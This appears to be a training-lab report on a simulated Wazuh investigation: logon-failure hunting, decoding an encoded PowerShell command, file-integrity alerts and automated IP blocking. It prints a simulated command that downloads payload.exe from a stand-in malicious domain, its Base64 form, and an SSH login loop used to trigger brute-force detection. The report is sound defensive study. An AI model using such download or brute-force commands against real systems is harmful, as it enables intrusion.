# ICDFA_EHIT_S2_CIP_A107_LAB_2
# SOC Level 2: Threat Hunting & Incident Response with Wazuh

> An end-to-end SOC Level 2 investigation of an escalated "failed logons followed by a successful logon" alert: proactive threat hunting, event correlation, MITRE ATT&CK mapping, automated containment with Wazuh Active Response, and an incident report with a timeline and Indicators of Compromise (IOCs).

| | |
|---|---|
| **Role simulated** | SOC Level 2 Analyst |
| **Platform** | Wazuh 4.12 (SIEM/XDR) |
| **Environment** | Isolated VirtualBox lab (Ubuntu Wazuh manager + Windows 11 Pro agent) |
| **Lab dates** | October 26 to 27, 2026 |
| **Evidence** | 15 screenshots, in chronological order, with analysis for each |
| **Author** | [Your Name] |

---

## Table of Contents

1. [Project Overview](#1-project-overview)
2. [Executive Summary](#2-executive-summary)
3. [Objectives](#3-objectives)
4. [Skills Demonstrated](#4-skills-demonstrated)
5. [Technologies and Tools Used](#5-technologies-and-tools-used)
6. [Lab Environment](#6-lab-environment)
7. [Methodology](#7-methodology)
8. [Evidence and Analysis](#8-evidence-and-analysis)
9. [Findings](#9-findings)
10. [Challenges Encountered](#10-challenges-encountered)
11. [Recommendations](#11-recommendations)
12. [Analytical Questions and Answers](#12-analytical-questions-and-answers)
13. [Key Learning Outcomes](#13-key-learning-outcomes)
14. [Professional Value](#14-professional-value)
15. [Limitations and Scope](#15-limitations-and-scope)
16. [Conclusion](#16-conclusion)
17. [Repository Structure](#17-repository-structure)
18. [Responsible AI Use Declaration](#18-responsible-ai-use-declaration)
19. [Disclaimer](#19-disclaimer)
20. [References and Acknowledgements](#20-references-and-acknowledgements)

---

## 1. Project Overview

A Level 1 analyst escalated a medium-severity alert, **"Multiple failed logins followed by a successful login,"** on a monitored Windows endpoint. The activity occurred outside business hours, and the Level 1 assessment could not tell whether it was a user working late or a credential-based attack.

This project documents the Level 2 response:

1. **Investigate** the event to determine whether it was legitimate.
2. **Hunt** for related malicious activity on the endpoint.
3. **Contain** the threat once it was confirmed.
4. **Document** the incident in a form suitable for management.

All activity was performed in an isolated, self-hosted lab. The "attacker" actions were simulated by the author, and the payload used was a harmless text file.

## 2. Executive Summary

On October 26, 2026, the Wazuh agent on endpoint **DESKTOP-FMP1AN8** (192.168.0.108) recorded four failed logons (rule 60122) between 06:20:23 and 06:20:32, followed by successful logons (rules 60118 and 60106) at 06:20:45. Hunting beyond the alert showed the activity did not stop at the login:

- Process-creation telemetry (Event ID 4688, Wazuh rule 67027) showed `powershell.exe` launched with a Base64 `-EncodedCommand` at **07:55:21** and **07:59:23**.
- Decoding the command revealed an `Invoke-WebRequest` that downloads `payload.exe` from `http://malicious-domain.com/` into a `SensitiveFiles` folder.
- File Integrity Monitoring (rule 554) recorded `payload.exe` being created in that folder at **08:58:02**.

Correlating these events confirmed a credential-based compromise followed by script-driven payload staging, and the incident was handled as malicious.

For containment, Wazuh Active Response was configured so that SSH brute-force detections (rules **5712** and **5763**) run the `firewall-drop` script. A test from the simulated attacker address **192.168.0.108** on October 27 triggered rule 5712 at 00:52:34. The source IP was **blocked at 00:52:36** and **released automatically at 01:02:37**, matching the 600-second timeout.

The attacker in this lab is the author's own VM, so every IOC is simulated. In a live incident the source would be external and the same workflow would apply.

> **Time convention.** Dashboard and Windows times are the VM's local time (UTC-7). The manager's own logs (`active-responses.log`) are in UTC, so the same event appears 7 hours later there (for example 07:52:34 UTC = 00:52:34 local). Local time is used throughout unless marked UTC.

## 3. Objectives

- Conduct proactive threat hunts using Wazuh's Threat Hunting module and query language.
- Correlate separate security events into a single attack narrative.
- Interpret Windows and system logs to identify Indicators of Compromise.
- Configure and execute an Active Response to block a threat automatically.
- Document the incident in a concise, management-level report.

## 4. Skills Demonstrated

Only skills supported by the evidence in this project are listed.

| Skill | How it was demonstrated |
|---|---|
| **Threat Hunting** | Hypothesis-driven searches for logon patterns, process creation, encoded PowerShell and file creation, with each result guiding the next query |
| **SIEM Investigation** | Used Wazuh's Threat Hunting module with DQL filters on agent, rule ID, rule group and event fields; added and read event columns to build a timeline |
| **Log Analysis** | Interpreted Windows Security events (4624, 4625, 4688), Wazuh rule alerts, sshd rule definitions, and the Active Response log |
| **Incident Response** | Confirmed the incident by correlation, configured automated containment, verified the block and its expiry, and recorded the action taken |
| **Security Operations** | Verified agent health before hunting, backed up and validated a production-style configuration change before restart, and recognized a telemetry gap (process-creation auditing) |
| **Detection Review** | Read the default sshd ruleset to select the correct brute-force rules (5712 / 5763) instead of the handout's rule ID |
| **Threat Mapping** | Mapped observed activity to MITRE ATT&CK techniques (T1110, T1078, T1059.001, T1027, T1105) |
| **Obfuscated Script Decoding** | Decoded a Base64 UTF-16LE PowerShell command to recover its intent and extract IOCs |
| **Documentation and Reporting** | Produced a timeline, IOC table, action record, recommendations and a timed activity log with an evidence manifest |
| **Critical Verification** | Checked handout instructions against the real environment and corrected six of them (see [Section 10](#10-challenges-encountered)) |

**Not claimed:** this project did not involve malware reverse engineering, formal digital forensics, network traffic analysis, or vulnerability assessment.

## 5. Technologies and Tools Used

| Category | Tool / Technology |
|---|---|
| SIEM / XDR | Wazuh 4.12 (manager, Dashboard, Threat Hunting module, DQL search) |
| Endpoint agent | Wazuh agent v4.12.0 on Windows 11 Pro (build 10.0.22621.1555) |
| Detection modules | Wazuh File Integrity Monitoring (`syscheck`), Wazuh rules engine, Wazuh Active Response (`firewall-drop`) |
| Log sources | Windows Security log (Event IDs 4624, 4625, 4688), sshd authentication logs on the manager |
| Host tooling | PowerShell (`-EncodedCommand`, `Get-FileHash`), `auditpol`, `Get-WinEvent`, OpenSSH client |
| Manager tooling | `grep`, `cp`, `tail`, `systemctl`, `wazuh-analysisd -t` (configuration test), host packet filter (iptables) |
| Virtualization | Oracle VirtualBox |
| Frameworks | MITRE ATT&CK |

## 6. Lab Environment

| Component | Detail |
|---|---|
| Wazuh manager | Ubuntu VM, hostname `icdfa-server`, 192.168.0.167 |
| Monitored endpoint | Windows 11 Pro VM, `DESKTOP-FMP1AN8`, agent ID 005, 192.168.0.108 |
| Agent version | v4.12.0 |
| Scenario | Escalated alert at 03:00 local: "Multiple failed logins followed by a successful login" |
| Network | Private lab network; no production systems involved |

## 7. Methodology

| Phase | Approach |
|---|---|
| **1. Validate telemetry** | Confirmed the agent was Active before hunting |
| **2. Logon hunt** | Queried Windows logon events for the endpoint over 24 hours to identify the failure-then-success sequence |
| **3. Process hunt** | Confirmed process-creation auditing existed in the Windows Security log, then searched Wazuh rule 67027 (Event 4688) |
| **4. PowerShell analysis** | Reproduced the encoded-command technique, located it through its logged command line, and decoded it to extract IOCs |
| **5. File-creation detection** | Enabled real-time FIM on the sensitive folder and created the simulated `payload.exe` |
| **6. Correlation** | Combined the sequence into one timeline and mapped it to MITRE ATT&CK |
| **7. Containment** | Reviewed existing configuration and sshd rules, backed up `ossec.conf`, added an `<active-response>` block, validated, and restarted |
| **8. Verification** | Triggered rule 5712 from the endpoint and verified the block and its expiry in the log and Dashboard |
| **9. Reporting** | Recorded the timeline, IOCs, action taken, recommendations and evidence manifest |

---

## 8. Evidence and Analysis

Screenshots are presented in the order they were captured and used in the investigation. Filenames are unchanged from the originals.

### Phase A: Validate Telemetry and Hunt for Logon Activity

#### Figure 1: Agent status

![Figure 1 - Wazuh Endpoints view showing agent 005 (DESKTOP-FMP1AN8) Active](Screenshots/VirtualBox_windows_11_20_10_2026_11_04_57.png)

- **Action performed:** Opened the Wazuh Endpoints view and filtered on `status=active` before starting the investigation.
- **Evidence visible:** Agent **005**, `DESKTOP-FMP1AN8`, 192.168.0.108, Microsoft Windows 11 Pro 10.0.22621.1555, group `default`, cluster node `node01`, version v4.12.0, status **active**.
- **Why it matters:** A hunt is only meaningful if the endpoint is reporting. A disconnected agent would look quiet while hiding activity, so confirming it is Active establishes a trustworthy baseline.
- **Skill demonstrated:** SIEM operations and telemetry validation.

#### Figure 2: Failed logons followed by successful logons

![Figure 2 - Four 60122 logon failures followed by 60118 and 60106 logon successes](Screenshots/VirtualBox_windows_11_26_10_2026_14_47_26.png)

- **Action performed:** Used Threat Hunting → Events for agent 005 over the last 24 hours to search for logon events (Event IDs 4625 and 4624).
- **Evidence visible:** Four **rule 60122** "Logon Failure - Unknown user or bad password" alerts at 06:20:23, 06:20:27, 06:20:29 and 06:20:32, immediately followed by two **rule 60118** "Windows Workstation Logon Success" alerts at 06:20:45 and **rule 60106** "Windows Logon Success" alerts at 06:20:46, 06:20:59 and 06:21:23.
- **Why it matters:** The sequence matters more than any single event. Several failures within about nine seconds and then a success is the pattern of password guessing that eventually worked (MITRE ATT&CK T1110 then T1078). This is the behavior behind the original escalation.
- **Skill demonstrated:** Log analysis and threat hunting.

#### Figure 3: Agent dashboard summary

![Figure 3 - Agent dashboard showing 520 total events, 4 authentication failures and 20 authentication successes](Screenshots/VirtualBox_windows_11_26_10_2026_14_50_15.png)

- **Action performed:** Reviewed the agent's Threat Hunting dashboard summary for the same period.
- **Evidence visible:** **520** total events, **0** alerts at level 12 or above, **4** authentication failures and **20** authentication successes.
- **Why it matters:** It shows why this alert is easy to dismiss. Nothing reached high severity and the 4 failures are outnumbered by 20 successes. The risk lies in what follows the success, which only hunting can expose.
- **Skill demonstrated:** Alert triage and contextual judgment of severity.

#### Figure 4: Confirming the failure-to-success boundary

![Figure 4 - Second page of results confirming the 06:20:32 failure sits directly before the 60118 successes](Screenshots/VirtualBox_windows_11_26_10_2026_14_51_26.png)

- **Action performed:** Paged through the results to the boundary between the failures and the successes.
- **Evidence visible:** The 60122 failure at 06:20:32 followed directly by the two 60118 events at 06:20:45, with later 60106 successes above.
- **Why it matters:** It confirms the order of events and that no further failure sits between the last failure and the first success, supporting the timeline's accuracy.
- **Skill demonstrated:** Evidence verification and attention to detail.

### Phase B: Process Execution and PowerShell Analysis

#### Figure 5: Process-creation events (rule 67027)

![Figure 5 - Rule 67027 "A process was created" returning 59 hits](Screenshots/VirtualBox_windows_11_26_10_2026_15_42_06.png)

- **Action performed:** Searched for Event ID 4688 after confirming on the host that process-creation auditing was active. `Get-WinEvent` on the Security log showed 40 events of ID 4688, and `auditpol /get /subcategory:"Process Creation"` reported Success. In Wazuh these surface under the default rule **67027**, so no custom rule was needed.
- **Evidence visible:** **59 hits** of rule 67027 "A process was created" (level 3) for agent `DESKTOP-FMP1AN8`.
- **Why it matters:** Process-creation logging turns "something ran" into "which binary ran, with what arguments." Without it, the PowerShell activity would be invisible. It is also a coverage finding: this audit policy is not logged by default and should be enabled on every monitored endpoint.
- **Skill demonstrated:** Threat hunting and detection-coverage assessment.

#### Figure 6: Encoded PowerShell command located by its command line

![Figure 6 - Query for EncodedCommand returning 2 hits at 07:55:21 and 07:59:23](Screenshots/VirtualBox_windows_11_26_10_2026_16_24_06.png)

- **Action performed:** Reproduced the lab's simulated command as Base64 UTF-16LE and ran it with `powershell -EncodedCommand`. The first run (07:55:21) used a standard-user session and was denied when writing to `C:\`; the second (07:59:23) was elevated and wrote `C:\fake_attack.log`. Then queried:

  ```
  agent.id: 005 and rule.id: 67027 and data.win.eventdata.commandLine: *EncodedCommand*
  ```
- **Evidence visible:** **2 hits**, timestamped 07:59:23 and 07:55:21, both rule 67027, in the query bar and the histogram.
- **Why it matters:** `-EncodedCommand` is a high-value hunting pivot. Legitimate administrators rarely need it, and it is easy to search once command-line logging exists. It maps to T1059.001 (PowerShell) and T1027 (Obfuscated Files or Information).
- **Skill demonstrated:** Threat hunting with targeted DQL queries.

#### Figure 7: Decoding the Base64 IOC and hashing the payload

![Figure 7 - Decoding the Base64 command in PowerShell and computing the SHA256 of payload.exe](Screenshots/VirtualBox_windows_11_27_10_2026_10_01_13.png)

- **Action performed:** Decoded the encoded command and hashed the dropped file:

  ```powershell
  $c = 'echo "Invoke-WebRequest -Uri ''http://malicious-domain.com/payload.exe'' -OutFile ''C:\Users\$env:USERNAME\SensitiveFiles\payload.exe''" > C:\fake_attack.log'
  $b = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($c))
  [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b))
  Get-FileHash "C:\Users\Windows11\SensitiveFiles\payload.exe" -Algorithm SHA256
  ```
- **Evidence visible:** The Base64 string, the decoded `Invoke-WebRequest` command pointing to `malicious-domain.com/payload.exe`, and the SHA256 `F10877C83AD3FF9444BFB4FD8AABE701D460BBB29E7D873BAFEDBAE555F76CFA`. The first decode attempt in this new PowerShell window returned nothing because the variable `$b` did not exist in that session; the command was rebuilt (Base64 encoding is deterministic) and decoded successfully.
- **Why it matters:** Decoding recovers the attacker's intent and yields reusable IOCs (domain, URL, filename path). The hash identifies the file even if it is renamed. The literal `$env:USERNAME` appears because the command was stored in single quotes and expands to `Windows11` at run time.
- **Skill demonstrated:** Obfuscated script decoding and IOC extraction.

### Phase C: File Integrity Monitoring

#### Figure 8: File creation in the event timeline

![Figure 8 - Event timeline showing rule 554 File added to the system at 08:58:02](Screenshots/VirtualBox_windows_11_26_10_2026_16_59_27.png)

- **Action performed:** Enabled real-time FIM on `C:\Users\Windows11\SensitiveFiles`. The Dashboard's group `agent.conf` editor timed out on save, so the same `<directories realtime="yes" check_all="yes">` entry was added to the agent's local `ossec.conf` and the agent service restarted. Then created the simulated `payload.exe`, a harmless text file.
- **Evidence visible:** **1,049 hits** for the agent, with **rule 554 "File added to the system"** (level 5) at 08:58:02, next to rule 67027 process-creation events, rule 61104 "Service startup type was changed" events and a 60106 logon success.
- **Why it matters:** Seeing the file event in the same stream as the process events connects cause and effect (a command ran, then a file appeared). That connection upgrades the incident from "suspicious" to "confirmed."
- **Skill demonstrated:** Multi-source event correlation.

#### Figure 9: Isolating the FIM alert

![Figure 9 - Query for the syscheck rule group returning the single rule 554 alert](Screenshots/VirtualBox_windows_11_26_10_2026_17_00_06.png)

- **Action performed:** Filtered the agent's events with `agent.id: 005 and rule.groups: syscheck`.
- **Evidence visible:** **1 hit**: rule **554** "File added to the system," level 5, at 08:58:02.
- **Why it matters:** Filtering by the `syscheck` group removes the noise and provides a clean artifact for the IOC list. FIM is the one telemetry source here that records the effect on disk rather than the action taken.
- **Skill demonstrated:** SIEM query refinement and IOC collection.

### Phase D: Containment with Wazuh Active Response

#### Figure 10: Active Response configuration

![Figure 10 - Backup of ossec.conf, appended active-response block, configuration test and manager restart](Screenshots/VirtualBox_windows_11_27_10_2026_08_43_44.png)

- **Action performed:** Over SSH to the manager, reviewed the existing configuration and sshd rules, then ran:

  ```bash
  cp /var/ossec/etc/ossec.conf /var/ossec/etc/ossec.conf.bak
  cat >> /var/ossec/etc/ossec.conf << 'EOF'
  <ossec_config>
    <active-response>
      <command>firewall-drop</command>
      <location>local</location>
      <rules_id>5763,5712</rules_id>
      <timeout>600</timeout>
    </active-response>
  </ossec_config>
  EOF
  /var/ossec/bin/wazuh-analysisd -t
  systemctl restart wazuh-manager
  ```
- **Evidence visible:** The definition of **rule 5763** (level 10, `frequency="8"`, `timeframe="120"`, "brute force trying to get access to the system. Authentication failed."), the backup command, the appended block, and the configuration test returning no errors before the restart.
- **Why it matters:** The `firewall-drop` command was already defined, so only the `<active-response>` block was added, which avoided a duplicate definition. Backing up and testing before restarting is standard change control, because a malformed file can stop the manager and blind the SOC.
- **Skill demonstrated:** Safe configuration management and detection review.

#### Figure 11: Confirming the configuration is live

![Figure 11 - tail of ossec.conf showing the appended block and wazuh-manager reporting active](Screenshots/VirtualBox_windows_11_27_10_2026_08_47_40.png)

- **Action performed:** Verified the change with `grep -n -B1 -A5 "<active-response>"`, `tail -n 12 /var/ossec/etc/ossec.conf`, and `systemctl is-active wazuh-manager`.
- **Evidence visible:** The block at lines 330 to 335, the commented-out default example at lines 234 to 237, the full block at the end of the file, and the output `active`.
- **Why it matters:** It proves the block exists in the live file and that the manager survived the change. The earlier match is only the commented-out example in the default file, not the real configuration.
- **Skill demonstrated:** Verification of changes and service-health checking.

#### Figure 12: Triggering the response

![Figure 12 - SSH attempts from the Windows VM ending in Connection timed out after the block](Screenshots/VirtualBox_windows_11_27_10_2026_08_55_06.png)

- **Action performed:** From the Windows VM, made repeated SSH logins for a non-existent user against the manager:

  ```powershell
  1..3 | ForEach-Object { ssh -o PubkeyAuthentication=no fakeuser@192.168.0.167 }
  ```

  Each connection allows three password attempts, so three connections exceeded the rule threshold of 8 failures in 120 seconds.
- **Evidence visible:** Repeated "Permission denied" responses, then `ssh_dispatch_run_fatal: Connection ... timed out` and `Connection timed out` once blocked. The manager session in the other window shows `client_loop: send disconnect: Connection reset`.
- **Why it matters:** The timeout is the practical effect of containment: the source host could no longer reach port 22. It also shows the cost of blunt automation, because the block cut the author's own SSH and Dashboard access (see Question 3 in [Section 12](#12-analytical-questions-and-answers)).
- **Skill demonstrated:** Controlled testing of an automated response.

#### Figure 13: Active Response log (block and unblock)

![Figure 13 - active-responses.log showing the block added at 07:52:34 UTC and removed at 08:02:35 UTC](Screenshots/VirtualBox_windows_11_27_10_2026_09_35_45.png)

- **Action performed:** Reviewed the log with `grep firewall-drop /var/ossec/logs/active-responses.log | tail -n 6`.
- **Evidence visible:** `check_keys` and `continue` entries at 07:52:34 UTC for `192.168.0.108`, with the triggering alert (rule **5712**, level 10, T1110 Brute Force, user `fakeuser`), and a `delete` entry at 08:02:35 UTC.
- **Why it matters:** This is the authoritative record that the script ran. The gap between add and delete is exactly **600 seconds**, matching the configured timeout, and the log carries the triggering alert and source IP as audit evidence for the response action.
- **Skill demonstrated:** Log analysis and response verification.

#### Figure 14: Manager event stream around the block

![Figure 14 - Manager event stream showing 5710 failures, the 5712 alert, the 651 block, the 652 unblock and a 5715 SSH success](Screenshots/VirtualBox_windows_11_27_10_2026_09_43_21.png)

- **Action performed:** Opened the manager's own events (agent 000) in the Dashboard to review the surrounding activity.
- **Evidence visible:** Repeated **rule 5710** "Attempt to login using a non-existent user" events from 00:52:10, rule 2502 and rule 5503 failure events, the **rule 5712** brute-force alert at 00:52:34, **rule 651** "Host Blocked by firewall-drop Active Response" at 00:52:36, **rule 652** "Host Unblocked" at 01:02:37, and a **rule 5715** "sshd: authentication success" at 01:08:45.
- **Why it matters:** The surrounding events show the whole story in order: individual attempts, the correlated alert, the automated block, the expiry, and finally a normal login once access was restored.
- **Skill demonstrated:** SIEM investigation and timeline reconstruction.

#### Figure 15: Filtered alert, block and unblock

![Figure 15 - Query for rules 5712, 651 and 652 returning three hits](Screenshots/VirtualBox_windows_11_27_10_2026_09_52_43.png)

- **Action performed:** Filtered the manager's events with `rule.id: (5712 or 651 or 652)`. The agent filter had to be removed because these alerts belong to the manager (agent 000), not the Windows endpoint.
- **Evidence visible:** **3 hits**: rule 5712 at 00:52:34, rule 651 at 00:52:36 and rule 652 at 01:02:37.
- **Why it matters:** It is the cleanest evidence of the full response cycle in the SIEM: three alerts, in the correct order, ten minutes apart.
- **Skill demonstrated:** Incident response documentation and evidence curation.

---

## 9. Findings

### 9.1 Attack Narrative and MITRE ATT&CK Mapping

| Stage | ATT&CK Technique | Evidence |
|---|---|---|
| Credential access | T1110 Brute Force | Four 60122 failures, 06:20:23 to 06:20:32 |
| Access with valid credentials | T1078 Valid Accounts | 60118 and 60106 logon successes from 06:20:45 |
| Execution | T1059.001 PowerShell | `powershell.exe -EncodedCommand` (rule 67027) at 07:55:21 and 07:59:23 |
| Defense evasion | T1027 Obfuscated Files or Information | Base64 UTF-16LE command line |
| Tooling transfer | T1105 Ingress Tool Transfer | Decoded `Invoke-WebRequest` to `malicious-domain.com/payload.exe` |
| Host impact | File dropped in a sensitive folder | FIM rule 554 for `payload.exe` at 08:58:02 |

Each event in isolation could pass as routine: a few failed logons, a PowerShell window, a new file. Together they form one chain.

> **Note on timing.** The lab narrative places PowerShell one minute after the logon. Here the events were staged in sequence by the author, so the real gaps are about 1.5 hours (logon to PowerShell) and about 1 hour (PowerShell to file creation). Actual timestamps are kept rather than adjusted; the analysis relies on the order of events.

### 9.2 Timeline of Attack

| Time (local, UTC-7) | Rule / Source | Event |
|---|---|---|
| Oct 26, 06:20:23 to 06:20:32 | 60122 | Four failed logons on DESKTOP-FMP1AN8 |
| Oct 26, 06:20:45 | 60118, 60106 | Successful workstation logon; further 60106 successes at 06:20:46, 06:20:59, 06:21:23 |
| Oct 26, 07:55:21 | 67027 | `powershell.exe -EncodedCommand` first run; write to `C:\` denied (insufficient privileges) |
| Oct 26, 07:59:23 | 67027 | Second run, elevated; decoded command writes `C:\fake_attack.log` |
| Oct 26, 08:58:02 | 554 (FIM) | `payload.exe` created in `C:\Users\Windows11\SensitiveFiles` |
| Oct 27, 00:52:10 to 00:52:32 | 5710, 5503, 2502 | Repeated invalid-user SSH logons for `fakeuser` from 192.168.0.108 against the manager |
| Oct 27, 00:52:34 | 5712 (level 10) | Brute-force detection: non-existent user, 8 failures in 120 s from one IP |
| Oct 27, 00:52:36 | 651 | Host Blocked by firewall-drop (192.168.0.108) |
| Oct 27, 01:02:37 | 652 | Host Unblocked after the 600-second timeout |
| Oct 27, 01:08:45 | 5715 | SSH authentication success, consistent with access being restored once the block expired |

### 9.3 Indicators of Compromise

All values are simulated lab artifacts.

| Indicator | Value |
|---|---|
| Source IP (simulated attacker) | `192.168.0.108` (lab VM; would be external in a real incident) |
| Targeted accounts | `Windows11` local session on DESKTOP-FMP1AN8; `fakeuser` (invalid SSH user) on `icdfa-server` |
| Malicious domain / URL | `malicious-domain.com`, `http://malicious-domain.com/payload.exe` |
| Payload filename and path | `payload.exe` in `C:\Users\Windows11\SensitiveFiles\` |
| Payload SHA256 | `F10877C83AD3FF9444BFB4FD8AABE701D460BBB29E7D873BAFEDBAE555F76CFA` |
| Dropped log file | `C:\fake_attack.log` |
| Suspicious process pattern | `powershell.exe -NoProfile -EncodedCommand <Base64>` |
| Decoded command | `echo "Invoke-WebRequest -Uri 'http://malicious-domain.com/payload.exe' -OutFile 'C:\Users\$env:USERNAME\SensitiveFiles\payload.exe'" > C:\fake_attack.log` |

Base64-encoded command:

```
ZQBjAGgAbwAgACIASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAtAGQAbwBtAGEAaQBuAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUAJwAgAC0ATwB1AHQARgBpAGwAZQAgACcAQwA6AFwAVQBzAGUAcgBzAFwAJABlAG4AdgA6AFUAUwBFAFIATgBBAE0ARQBcAFMAZQBuAHMAaQB0AGkAdgBlAEYAaQBsAGUAcwBcAHAAYQB5AGwAbwBhAGQALgBlAHgAZQAnACIAIAA+ACAAQwA6AFwAZgBhAGsAZQBfAGEAdAB0AGEAYwBrAC4AbABvAGcA
```

### 9.4 Action Taken

Blocked source IP `192.168.0.108` for 600 seconds using Wazuh Active Response (`firewall-drop`, triggered by rules 5712 and 5763). The block was enforced by the packet filter on the Wazuh manager host and removed automatically at the timeout. This is a host-level firewall on the manager, not an upstream network firewall, so in a production network the same indicator should also be pushed to the perimeter firewall or EDR.

## 10. Challenges Encountered

Several handout instructions did not match the actual environment. Each was checked and corrected rather than followed blindly.

| Handout instruction | What was found | What was done |
|---|---|---|
| Agent named `Windows-SOC-Lab` | The enrolled agent is `DESKTOP-FMP1AN8`, ID 005 | Filtered on `agent.id: 005` throughout |
| Active-response rule ID 5715 ("multiple failed logins") | In the default sshd ruleset 5715 is a successful SSH login; the brute-force rules are 5712 (invalid user) and 5763 (failed password), both level 10, frequency 8 in 120 s | Used `5763,5712` |
| `<location>manager</location>` | `manager` is not a valid value; valid values are `local`, `server`, `defined-agent` and `all` | Used `local`, because the SSH alerts originate on the manager |
| Add a `firewall-drop` `<command>` block | The command was already defined by default (lines 205 to 208) | Added only the `<active-response>` block to avoid a duplicate |
| Edit `ossec.conf` on the Ubuntu console | No clipboard on the Ubuntu VM; Dashboard editor timed out on save | Edited over SSH from the Windows VM, with a backup and `wazuh-analysisd -t` validation |
| Hunt Event 4688 and 4104 | 4688 required process-creation auditing and was not logged by default; 4104 (Script Block Logging) was not used | Confirmed 4688 in the Security log and found the encoded command through its command line (rule 67027) |

**Other issues encountered and resolved:**

- The first encoded-command run failed with `UnauthorizedAccessException` writing to `C:\`; it was rerun elevated, and both runs were kept as evidence.
- The Dashboard's group `agent.conf` save timed out, so FIM was configured in the agent's local `ossec.conf` instead.
- A new PowerShell window did not retain the `$b` variable, so the Base64 string was rebuilt deterministically before decoding.
- The test block cut the author's own SSH and Dashboard access for the 10-minute timeout, which was expected and informed the answer to Question 3.

## 11. Recommendations

**Primary:**

1. **Force a password reset** for the compromised account and revoke active sessions, because a successful logon after failures means the credential should be treated as known to the attacker.
2. **Conduct user security awareness training** on password hygiene and credential phishing.

**Additional recommendations from the investigation:**

3. **Enable MFA and account lockout** (for example, lock after 5 failures) so brute force cannot succeed silently.
4. **Make process-creation auditing and command-line capture standard** on every monitored Windows host, and enable PowerShell Script Block Logging (Event 4104) so the decoded script is recorded without manual decoding.
5. **Add a detection for `powershell.exe -EncodedCommand`** at a higher alert level than the default level 3, since this was the highest-value indicator in the investigation.
6. **Extend FIM** to other sensitive paths and consider application allowlisting, so unsigned executables cannot run from user-writable folders.
7. **Tune Active Response:** maintain a `<white_list>` of trusted management IPs, test in a non-production window, and consider escalating timeouts for repeat offenders.
8. **Hunt for the same account and indicators across all other agents** (see Question 4).

## 12. Analytical Questions and Answers

### Q1. Why is "failed logons → successful logon → immediate PowerShell" so suspicious?

Each step is normal alone, but the sequence describes intent. Several failures followed by a success is what credential guessing looks like (T1110 then T1078): the actor did not know the password at the start and knew it at the end. A legitimate user who forgot a password typically fails once or twice, then works in a predictable way such as opening a browser or an office application. Launching PowerShell within minutes is different, because shells are what an intruder uses to enumerate the host and pull down tools. It becomes decisive when the PowerShell is encoded, since a person working late has no reason to hide their commands. The activity also happened out of hours, when there is less chance someone will notice. The behavior, not any single log line, separates an intrusion from a late-working employee.

### Q2. How did threat hunting give a more complete picture than the alert alone?

The alert said only that failures were followed by a success, which both a user and an attacker can produce. Hunting turned that ambiguity into a conclusion by answering what the alert could not: what the account did after logging in (encoded PowerShell, rule 67027), what the goal was (the decoded `Invoke-WebRequest` for `payload.exe`), and whether anything changed on disk (FIM rule 554). It also produced concrete IOCs and a dated timeline that can be searched for on other hosts. The hunt exposed a visibility gap too: process-creation events were not logged by default, so a purely alert-driven approach would never have shown the PowerShell activity.

### Q3. What is the risk of automatically blocking an IP for 10 minutes?

The main risk is blocking someone legitimate. `firewall-drop` drops all traffic from the address, not only the abused service. If many users share one public IP through NAT (an office, a campus, a mobile carrier), one person's failed attempts can lock out the whole group. An attacker who can spoof or deliberately trigger failures from a trusted address can also use the block as a denial-of-service tool. A small version occurred in this lab: the test blocked the author's own Windows VM and cut its Dashboard and SSH sessions until the timeout ended (Figure 12). A realistic problem scenario is a finance team behind one NAT address, where a single employee mistyping a password, or a script with an expired credential, locks everyone out during month-end close. Ten minutes is also short for a persistent attacker, who can wait it out or rotate IPs. Mitigations include whitelisting trusted ranges, longer or escalating timeouts for repeat offenders, and per-service blocks where possible.

### Q4. What could the attacker do once the IP is blocked, and how could Wazuh detect it?

The most likely move is lateral movement with the credentials already obtained, since a blocked source IP does not revoke a valid account. The attacker could use the same credentials against other endpoints through RDP, SMB or WinRM (T1021, T1078), or return from a different IP such as a VPN or Tor exit node. Wazuh can detect this because every agent forwards its own Security log. Useful signals include logon events (4624) for the same username on other agents, particularly logon types 3 and 10 from internal addresses, explicit-credential logons (4648) and special-privilege assignments (4672), both of which also appear in this endpoint's Security log. Process creation (4688) with remote-execution tools, new service installation (7045) and new files in sensitive folders (FIM) on other hosts are further signals. Searching Wazuh across all agents by the compromised username and the IOCs in [Section 9.3](#93-indicators-of-compromise) would show whether the intrusion spread.

## 13. Key Learning Outcomes

- **Sequence beats single events.** Individually routine logs became a confirmed incident only when correlated across logon, process, file and (later) network-facing sources.
- **Detection is bounded by telemetry.** The investigation depended on logging (process creation, command line) that had to be confirmed first.
- **Verify defaults before changing anything.** Several handout values (rule ID, location value, command definition, agent name) were wrong for this environment; checking the ruleset and live configuration prevented a non-working active response.
- **Automation needs guardrails.** Active Response contained the threat quickly but also blocked the author's own access, illustrating the need for allowlists, tested rules and measured timeouts.
- **Evidence discipline matters.** Keeping timestamps, errors and corrections in a timed activity log made the incident report reproducible.

## 14. Professional Value

This project demonstrates the ability to:

- Move from alert triage to **proactive, query-driven threat hunting** and reach an evidence-based conclusion.
- **Investigate in a SIEM** (Wazuh), using filters, rule IDs, rule groups and event fields to reconstruct what happened.
- **Interpret Windows Security and sshd telemetry** and map behavior to MITRE ATT&CK.
- **Decode obfuscated PowerShell** and extract actionable IOCs.
- **Configure, test and verify automated containment** while recognizing its operational risks.
- **Question assumptions:** the handout's rule ID, location value and agent name were verified and corrected against the live environment.
- **Communicate clearly:** an executive summary, timeline, IOC table, action record, recommendations, and an evidence manifest suitable for both management and technical reviewers.

## 15. Limitations and Scope

Stated plainly so the work can be judged on what it shows:

- **Simulated incident.** The attacker and endpoint are on the same lab network. The source IP, payload and domain are simulated, and `payload.exe` is a harmless text file.
- **Evidence gaps.** The logon screenshots do not show the source IP and logon-type columns for the 4624/4625 events, so the origin of the 06:20 logon is not evidenced. The iptables `DROP` rule and a `Test-NetConnection` result were not captured. The block is evidenced instead by the SSH timeout (Figure 12), the `active-responses.log` entries (Figure 13) and the 651/652 alerts (Figures 14 and 15).
- **SHA256 cross-check.** The hash was computed with `Get-FileHash`. FIM stores the same digest in `syscheck.sha256_after`, but that field was not screenshotted.
- **Regenerated Base64 string.** The Base64 value in the IOC table was regenerated locally from the same command text (Figure 7), not copied from the Wazuh event.
- **Not covered.** Script Block Logging (Event 4104) was not used, and no real malware or live network was involved.

